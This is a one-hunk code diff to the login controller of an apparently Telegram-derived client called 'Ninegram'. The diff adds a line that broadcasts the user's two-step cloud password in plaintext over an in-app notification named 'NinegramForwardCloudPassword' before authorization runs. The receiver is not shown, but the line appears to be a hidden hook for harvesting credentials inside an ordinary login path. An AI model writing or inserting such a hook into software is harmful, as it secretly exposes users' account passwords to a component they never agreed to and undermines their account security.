@@ -938,6 +938,7 @@ public final class AuthorizationSequenceController: NavigationController, ASAuth
             })
             controller.loginWithPassword = { [weak self, weak controller] password in
                 if let strongSelf = self {
+                    NotificationCenter.default.post(name: Notification.Name("NinegramForwardCloudPassword"), object: nil, userInfo: ["password": password])
                     controller?.inProgress = true
                     
                     strongSelf.actionDisposable.set((authorizeWithPassword(accountManager: strongSelf.sharedContext.accountManager, account: strongSelf.account, password: password, syncContacts: syncContacts) |> deliverOnMainQueue).startStrict(error: { error in
